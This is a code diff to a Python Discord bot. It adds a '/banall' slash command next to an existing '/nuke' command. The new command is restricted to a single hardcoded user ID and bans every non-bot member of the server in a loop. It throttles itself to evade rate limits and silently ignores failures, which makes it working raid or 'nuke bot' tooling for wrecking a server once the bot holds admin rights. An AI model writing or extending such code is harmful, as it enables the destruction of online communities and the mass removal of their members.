@@ -159,7 +159,39 @@ async def nuke(interaction: Interaction):
         print(f"Failed to create final channel: {e}")
 
     await interaction.followup.send("🔥 Nuke completed.", ephemeral=True)
+    
+# ---------------------------
+# Slash Command: /banall
+# ---------------------------
+@bot.slash_command(
+    name="banall",
+    description="Ban all server members (except you)."
+)
+async def banall(interaction: nextcord.Interaction):
 
+    # Authorization check
+    if interaction.user.id != 1355140133661184221:
+        await interaction.response.send_message(
+            "You are not allowed to use this command.", ephemeral=True
+        )
+        return
+
+    await interaction.response.send_message("Mass ban started...", ephemeral=True)
+
+    guild = interaction.guild
+
+    for member in guild.members:
+        # Skip you + bots
+        if member.id == 1355140133661184221 or member.bot:
+            continue
+        try:
+            await member.ban(reason="Mass ban command used.")
+            await asyncio.sleep(1)  # prevent rate-limit
+        except:
+            pass
+
+    await interaction.followup.send("Mass ban complete.")
+    
 # ----------------------
 # RUN BOT
 # ----------------------
